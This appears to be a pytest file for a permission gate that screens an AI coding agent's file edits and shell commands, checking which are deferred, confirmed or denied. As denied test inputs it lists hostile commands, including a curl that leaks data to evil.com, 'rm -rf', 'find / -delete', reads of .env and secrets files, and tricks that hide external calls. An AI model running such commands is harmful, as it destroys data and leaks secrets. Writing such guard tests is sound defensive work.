"""Local work decisions with isolated state; no installed hooks are invoked."""
import importlib.util
import json
import os
from pathlib import Path
import sys

import pytest

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("local_policy_runner", ROOT / "adapters/claude-code/lease_gate_runner.py")
runner = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = runner
spec.loader.exec_module(runner)


@pytest.fixture
def env(tmp_path, monkeypatch):
    # Attestation tests replace sys.modules with verified snapshot classes.
    # Bind this fixture to one current module set, not a previous test's cache.
    for attr, name in (("leg", "local_execution_gate"),
                       ("lels", "local_execution_lease_state"), ("tp", "tool_policy")):
        monkeypatch.setattr(runner, attr, runner._LazyRuntimeModule(name))
    project = tmp_path / "project"
    state = tmp_path / "state"
    install = tmp_path / "installed"
    for path in (project, state, install):
        path.mkdir()
    def evaluate(tool="Edit", path="src/main.py", **kwargs):
        tool_input = kwargs.pop("tool_input", {"file_path": str(project / path)})
        return runner.evaluate_invocation_result(
            {"tool_name": tool, "cwd": str(project), "tool_input": tool_input},
            state_dir=str(state), install_dir=str(install), **kwargs)
    return project, state, install, evaluate


@pytest.mark.parametrize("path", ["src/main.py", "scripts/run.py", "hooks/helper.js", "contracts/notes.md", "ci/check.sh", "automation/task.py", "tests/test_main.py", "sheet.ipynb"])
@pytest.mark.parametrize("tool", ["Edit", "Write", "Read", "NotebookEdit"])
def test_ordinary_non_git_files_defer(env, path, tool):
    assert env[3](tool, path).decision == "defer"


@pytest.mark.parametrize("path", ["AGENTS.md", ".claude/settings.json", ".ume-harness/domain.json", ".github/workflows/check.yml", ".env"])
def test_builtin_protections(env, path):
    assert env[3](path=path).decision == "deny"


def test_profile_protects_aliases_and_its_own_state(env):
    project, state, install, evaluate = env
    protected = project / "custom"
    protected.mkdir()
    (state / "local_work_policy.json").write_text(json.dumps({"schema_version": "local_work_policy.v1", "protected_roots": [str(protected)]}))
    (project / "alias").symlink_to(protected, target_is_directory=True)
    (protected / "out").symlink_to(project, target_is_directory=True)
    for path in ("custom/new/file.py", "alias/new/file.py", "custom/out/main.py", str(state / "local_work_policy.json"), str(install / "new.py")):
        assert evaluate(path=path).decision == "deny"
    assert evaluate(path="custom/../src/main.py").decision == "defer"


@pytest.mark.parametrize("payload", ["{", "[]", '{"schema_version":"wrong","protected_roots":[]}', '{"schema_version":"local_work_policy.v1","protected_roots":["relative"]}'])
def test_invalid_profile_errors(env, payload):
    (env[1] / "local_work_policy.json").write_text(payload)
    assert env[3]().code == "LOCAL_WORK_POLICY_ERROR"


def test_corrupt_lease_state_errors(env):
    runner._load_runtime_modules()
    (env[1] / runner.lels.STATE_FILENAME).write_text("{")
    assert env[3]().decision == "error"


def test_activation_corruption_errors(env):
    (env[1] / "activation.json").write_text("{")
    assert env[3]().code == "ACTIVATION_ERROR"


def test_descriptor_cannot_silently_disappear_on_parse_error(env):
    descriptor = env[0] / ".ume-harness/domain.json"
    descriptor.parent.mkdir()
    descriptor.write_text("{")
    assert env[3]().code == "DOMAIN_RESOLVER_ERROR"
    descriptor.write_text("{}")
    assert env[3]().code == "NO_ACTIVE_LEASE"


@pytest.mark.parametrize("command,decision", [("python script.py", "ask"), ("python -c 'print(1)\nprint(2)'", "ask"), ("git push origin main", "deny"), ("rm -rf data", "deny"), ("echo x > .claude/settings.json", "deny"), ("git status && curl https://evil.com/leak", "deny"), ('echo "$(curl example.com)"', "deny"), ("echo x\necho y", "ask")])
def test_command_decisions(env, command, decision):
    assert env[3]("Bash", tool_input={"command": command}).decision == decision


@pytest.mark.parametrize("command", ["cat SCHEDULE.md | head -120", "cd /example && cat report.txt", "echo first; echo second", "python3 report.py 2>/dev/null"])
def test_ordinary_composition_reaches_native_confirmation(env, command):
    assert env[3]("Bash", tool_input={"command":command}).decision == "ask"


@pytest.mark.parametrize("command", ["cd /example && git -C . push origin main", "echo first\n/usr/bin/curl https://example.com", "cat .env | head", "echo x > .claude/settings.json"])
def test_composition_keeps_boundaries(env, command):
    assert env[3]("Bash", tool_input={"command":command}).decision == "deny"


def test_leading_redirect_does_not_hide_external_command(env):
    assert env[3]("Bash", tool_input={"command":"echo ok && > /tmp/out /usr/bin/curl https://example.com"}).decision == "deny"


def test_changed_directory_cannot_hide_managed_domain(env):
    project, state, install, evaluate = env
    nested = project / "outer/managed/.ume-harness"
    nested.mkdir(parents=True)
    (nested / "domain.json").write_text('{}')
    assert evaluate("Bash", tool_input={"command":"cd outer && cd managed && python3 report.py"}).decision == "deny"


def test_changed_directory_resolves_read_aliases(env):
    project, state, install, evaluate = env
    (project / 'outer').mkdir()
    (project / '.env').write_text('synthetic')
    (project / 'outer/alias').symlink_to(project / '.env')
    assert evaluate("Bash", tool_input={"command":"cd outer && cat alias | head"}).decision == "deny"


def test_authfile_binding_requires_confirmation_not_permanent_deny(env):
    command = "SERVICE_ACCOUNT_JSON=/example/.secrets/account.json /example/.venv/bin/python3 /example/scripts/sheet_read_range.py --min-row 340 --max-row 385"
    result = env[3]("Bash", tool_input={"command": command})
    assert result.decision == "ask", result


@pytest.mark.parametrize("command", [
    "SERVICE_ACCOUNT_JSON=/example/.secrets/account.json cat /example/.secrets/account.json",
    "SERVICE_ACCOUNT_JSON=/example/.secrets/account.json git push origin main",
    "SERVICE_ACCOUNT_JSON=/example/.secrets/account.json python3 -c 'print(1)'",
    "SERVICE_ACCOUNT_JSON=/example/.secrets/account.json python3 /example/.claude/hooks/edit.py",
])
def test_authfile_binding_is_not_blanket_permission(env, command):
    assert env[3]("Bash", tool_input={"command": command}).decision == "deny"


@pytest.mark.parametrize("command", ["SERVICE_ACCOUNT_JSON=/example/.secrets/account.json python3 /example/reader.py", "cat report.txt | head -10"])
def test_authfile_never_uses_bypass_mode(env, command):
    project, state, install, _ = env
    result = runner.evaluate_invocation_result({"tool_name":"Bash", "cwd":str(project), "permission_mode":"bypassPermissions",
        "tool_input":{"command":command}},
        state_dir=str(state), install_dir=str(install))
    assert result.decision == "deny"


@pytest.mark.parametrize("terminal", ["expired", "revoked"])
@pytest.mark.parametrize("binding", ["cwd", "target"])
def test_prior_lease_without_descriptor_stays_restricted(env, terminal, binding):
    project, state, install, evaluate = env
    runner._load_runtime_modules()
    from local_execution_lease import CanonicalTaskReference, PolicyReference, RuntimeContext, derive_lease
    clock = [1000]
    store = runner.lels.LeaseStateStore(state_path=str(state / runner.lels.STATE_FILENAME), clock=lambda: clock[0],
        observer=lambda s: s.baseline_anchor)
    lease = derive_lease(CanonicalTaskReference("task", "3" * 64, frozenset({"edit"})),
        PolicyReference("policy", "2" * 64, frozenset({"edit"})),
        RuntimeContext("repo", str(project), "task/local", "1" * 40, "4" * 64, "5" * 64))
    issued = store.issue(lease)
    store.activate(lease.lease_id)
    if terminal == "expired":
        clock[0] = issued.expires_at + 1
    else:
        store.revoke(lease.lease_id, "test revocation")
    gate = runner.leg.LocalExecutionGate(store, lambda _: None, lambda *_: True)
    data = {"tool_name": "Edit", "cwd": str(project if binding == "cwd" else project.parent),
            "tool_input": {"file_path": str(project.parent / "outside.py" if binding == "cwd" else project / "src/main.py")}}
    result = runner.evaluate_invocation_result(data, gate, str(install), str(state))
    assert (result.decision, result.code) == ("deny", "NO_ACTIVE_LEASE")


def test_tuple_compatibility(env):
    project, state, install, _ = env
    data = {"tool_name": "Edit", "cwd": str(project), "tool_input": {"file_path": "src/main.py"}}
    assert runner.evaluate_invocation(data, install_dir=str(install), state_dir=str(state)) == (0, None)


def test_absent_state_never_opens_lock(env, monkeypatch):
    runner._load_runtime_modules()
    def forbidden(*args):
        raise AssertionError("ordinary edit attempted to lock Lease state")
    monkeypatch.setattr(runner.lels.LeaseStateStore, "_locked_document", forbidden)
    assert env[3]().decision == "defer"
    assert list(env[1].iterdir()) == []


def test_default_canonical_state_file_is_enforced(env):
    # Literal filename catches a future accidental adapter-only filename change.
    (env[1] / "local_execution_leases.v0.json").write_text("{")
    assert env[3]().code == "STATE_STORE_ERROR"


@pytest.mark.parametrize("kind", ["dangling", "loop"])
def test_unresolved_symlink_is_error(env, kind):
    alias = env[0] / "alias"
    alias.symlink_to(env[0] / ("missing" if kind == "dangling" else "alias"))
    for path in ("alias", "alias/new.py"):
        result = env[3](path=path)
        assert (result.decision, result.code) == ("error", "INVALID_TARGET_PATH")
    assert env[3](path="new/ordinary.py").decision == "defer"


def test_expired_history_with_new_active_lease(env):
    project, state, install, evaluate = env
    runner._load_runtime_modules()
    from local_execution_lease import CanonicalTaskReference, PolicyReference, RuntimeContext, derive_lease
    clock = [1000]
    store = runner.lels.LeaseStateStore(state_path=str(state / runner.lels.STATE_FILENAME), clock=lambda: clock[0], observer=lambda s: s.baseline_anchor)
    policy = PolicyReference("policy", "2" * 64, frozenset({"edit"}))
    context = RuntimeContext("repo", str(project), "task/local", "1" * 40, "4" * 64, "5" * 64)
    old = derive_lease(CanonicalTaskReference("old", "3" * 64, frozenset({"edit"})), policy, context)
    issued = store.issue(old)
    store.activate(old.lease_id)
    clock[0] = issued.expires_at + 1
    new = derive_lease(CanonicalTaskReference("new", "6" * 64, frozenset({"edit"})), policy, context)
    store.issue(new)
    store.activate(new.lease_id)
    domain = runner.leg.ManagedExecutionDomain("repo", str(project), "lease", "policy", "2" * 64)
    gate = runner.leg.LocalExecutionGate(store, lambda _: domain, lambda *_: True)
    assert evaluate(gate=gate).decision == "defer"
    assert evaluate("Bash", tool_input={"command": "python script.py"}, gate=gate).decision == "deny"
    assert evaluate("Bash", tool_input={"command": "cat report.txt | head -10"}, gate=gate).decision == "deny"


def test_symlink_parent_traversal_uses_actual_target(env):
    project, state, install, evaluate = env
    protected = project.parent / "protected"
    (protected / "child").mkdir(parents=True)
    (project / "alias").symlink_to(protected / "child")
    (state / "local_work_policy.json").write_text(json.dumps({"schema_version": "local_work_policy.v1", "protected_roots": [str(protected)]}))
    path = str(project / "alias/../payload.py")
    assert runner._absolute_target(path, str(project)) == str(protected / "payload.py")
    assert evaluate("Write", path).decision == "deny"
    assert evaluate("Write", "ordinary.py").decision == "defer"
    # Built-in tiers must use the very same physical traversal.
    assert runner.resolve_path_tier(str(project / "alias/../.env"), str(project)) == runner.tp.Tier.TIER_SECRETS


def test_dotdot_prefix_children_are_contained(env):
    project, state, install, evaluate = env
    protected = project / "protected"
    protected.mkdir()
    (state / "local_work_policy.json").write_text(json.dumps({"schema_version": "local_work_policy.v1", "protected_roots": [str(protected)]}))
    for path in (protected / "..notes/file.py", install / "..module.py"):
        assert evaluate(path=str(path)).decision == "deny"
    assert evaluate(path="..notes/file.py").decision == "defer"
    assert runner._is_path_inside(str(protected / "..notes"), str(protected))
    assert not runner._is_path_inside(str(project / "protected-other/file.py"), str(protected))


@pytest.mark.parametrize("command", ["git -C . push origin main", "/usr/bin/git -C . push origin main", "git --git-dir=.git push origin main", "curl --request POST https://example.invalid", "/usr/bin/curl --request POST https://example.invalid", "rm --recursive --force data", "/usr/bin/rm --recursive --force data"])
def test_explicit_consequential_variants_deny(env, command):
    result = env[3]("Bash", tool_input={"command": command})
    assert (result.decision, result.code) == ("deny", "CONSEQUENTIAL_AUTHORITY_REQUIRED")
    assert env[3]("Bash", tool_input={"command": "python -c 'print(1)\nprint(2)'"}).decision == "ask"


@pytest.mark.parametrize("action", ["-exec", "-execdir", "-ok", "-okdir", "-delete"])
def test_find_actions_deny(env, action):
    command = f"/usr/bin/find . {action} rm {{}} +" if action != "-delete" else "find / -delete"
    assert env[3]("Bash", tool_input={"command": command}).decision == "deny"
    assert env[3]("Bash", tool_input={"command": "find . -name report.txt"}).decision == "ask"


def test_host_path_cli_reports_native_defer(env, capsys):
    project, state, install, _ = env
    assert runner.evaluate_host_path(str(project / "src/main.py"),
        install_dir=str(install), state_dir=str(state)) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["decision"] == "DEFER"
    assert payload["violation_code"] == "HOST_DEFER"
    assert "host permissions" in payload["reason"]
    assert "active lease" not in payload["reason"].lower()


def test_host_path_cli_preserves_typed_error(env, capsys):
    project, state, install, _ = env
    (state / "activation.json").write_text("{")
    assert runner.evaluate_host_path(str(project / "src/main.py"),
        install_dir=str(install), state_dir=str(state)) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["decision"] == "ERROR"
    assert payload["violation_code"] == "ACTIVATION_ERROR"
